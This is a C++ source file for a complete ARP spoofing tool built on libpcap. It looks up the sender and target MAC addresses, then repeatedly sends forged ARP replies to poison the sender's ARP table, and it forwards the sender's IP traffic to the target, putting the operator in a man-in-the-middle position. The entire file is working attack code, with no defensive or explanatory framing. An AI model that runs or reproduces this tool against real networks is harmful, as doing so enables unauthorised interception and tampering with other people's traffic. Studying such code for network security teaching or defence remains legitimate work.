#include <iostream>
#include <fstream>

#include <cstdio>
#include <cstring>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/ioctl.h>

#include <arpa/inet.h>
#include <net/if.h>
#include <pcap.h>
#include <unistd.h>

#include "mac.h"
#include "ip.h"
#include "ethhdr.h"
#include "arphdr.h"
#include "ipv4hdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
}

void getAttackerInfo(string interface, Mac& attackerMac, Ip& attackerIp ) {
    //get Mac Address
    ifstream fp ("/sys/class/net/" + interface + "/address");
    string macaddr;
    fp >> macaddr;
    fp.close();
    attackerMac = macaddr;

    // get IP Address
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ -1);

    ioctl(s, SIOCGIFADDR, &ifr);

    string ipaddr = inet_ntoa(((sockaddr_in *) &ifr.ifr_addr) -> sin_addr);
    attackerIp = Ip(ipaddr);

}

void sendARPPacket(pcap_t* handle, Mac& eth_dmac, Mac& eth_smac, Mac& arp_smac, Ip& arp_sip, Mac& arp_tmac, Ip& arp_tip, bool isRequest ){

	EthArpPacket packet;

	packet.eth_.dmac_ = eth_dmac;
	packet.eth_.smac_ = eth_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = isRequest ? htons(ArpHdr::Request) : htons(ArpHdr::Reply);
	packet.arp_.smac_ = arp_smac;
	packet.arp_.sip_ = htonl(arp_sip);
	packet.arp_.tmac_ = arp_tmac;
	packet.arp_.tip_ = htonl(arp_tip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void getMACAddress(pcap_t* handle, Mac& senderMac, Ip& senderIp, Mac& attackerMac, Ip& attackerIp) {
    Mac broadcastMac = Mac("FF:FF:FF:FF:FF:FF");
    Mac nullMac = Mac("00:00:00:00:00:00");
    
    sendARPPacket(handle, broadcastMac, senderMac, attackerMac, attackerIp, nullMac, senderIp, true );

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        
        if (res == 0) continue;

        EthArpPacket* ethArpPacket = (EthArpPacket*)packet;
        if(ethArpPacket->eth_.type() == EthHdr::Arp && ethArpPacket->arp_.op() == ArpHdr::Reply && ethArpPacket->arp_.sip() == senderIp && ethArpPacket->arp_.tip() == attackerIp){
            senderMac = ethArpPacket->arp_.smac();
            break;
        }
    }
}

int main(int argc, char* argv[]) {
	int len = argc/2;
	if (argc < 4 || argc %2  != 0 ) {
		usage();
		return -1;
	}

	Mac attackerMac, senderMac, targetMac;
	Ip attackerIp, senderIp, targetIp;

	string interface = argv[1];
	
	cout << "\n---------------" << '\n';
	cout << "<Attacker>" << '\n';
	getAttackerInfo(interface, attackerMac, attackerIp);
	cout << "MAC : " << string(attackerMac) << '\n';
	cout << "IP : " << string(attackerIp) << '\n';
	cout << "---------------" << '\n';
	
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for(int i=1; i<len ; i++) {
		pid_t pid = fork();
		if(pid < 0) {
			cout << "fork error" << "\n";
			return -1;
		}
		else if(pid == 0) {
			cout << "<Sender>" << '\n';
			cout << "IP : " << argv[i*2] << '\n';
			senderIp = Ip(argv[i*2]);
			getMACAddress(handle, senderMac, senderIp, attackerMac, attackerIp);
			cout << "MAC : " << string(senderMac) << '\n';
			cout << "---------------" <<'\n';
			
			cout << "<Target>\n";
			cout << "IP : " << argv[i*2+1] << '\n';
			targetIp = Ip(argv[i*2 +1]);
			getMACAddress(handle, targetMac, targetIp, attackerMac, attackerIp);
			cout << "MAC : " << string(targetMac) << "\n";
			cout << "---------------\n";
			
			cout << "Starting ARP Spoofing" << '\n';
			cout << "exit : Ctrl + c" << '\n' << '\n';
	
			auto arp_spoof=[&]() {
				pid_t pid = fork();
				if (pid <0) return;
			
				else if (pid == 0) {
					while(true) { 
						cout << "Infecting ARP Table\n";
						sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
						sleep(10);
					}
				}
				else {
					while (true) {
						struct pcap_pkthdr* header;
						const u_char* packet;
						int res = pcap_next_ex(handle, &header, &packet);
						if (res == 0 || packet== NULL ) continue;
						if (res == -1 || res == -2) {
							cout << "ERROR" << '\n';
							break;
						}
						EthHdr* ethHdr = (EthHdr*)packet;
						
						if (ethHdr->smac_ != senderMac) {
							continue;
						}
						
						if (ethHdr->type() == EthHdr::Arp) {
							ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
							if (arpHdr->op() == ArpHdr::Request && arpHdr -> tip() == targetIp) {
								cout << "Infecting ARP Table" << '\n';
								sendARPPacket(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
							}
						} 

						else if (ethHdr->type() == EthHdr::Ip4 ) {
							struct IPv4Hdr* ipHdr = (struct IPv4Hdr*)(packet + sizeof(EthHdr));
							if (ntohl(ipHdr->ip_src) == senderIp ) {
								cout <<"..." << '\n';
								ethHdr -> smac_ = attackerMac;
								ethHdr -> dmac_ = targetMac;
								
								pcap_sendpacket(handle, packet, header->len);
							} 
						}
					}
				}
			};
			arp_spoof();

		}
		else {
			continue;
		}
	}

	int status;
	for (int i=1; i< argc/2 ; i++) {
	wait(&status); 
	}
    
	pcap_close(handle);
	return 0;
}
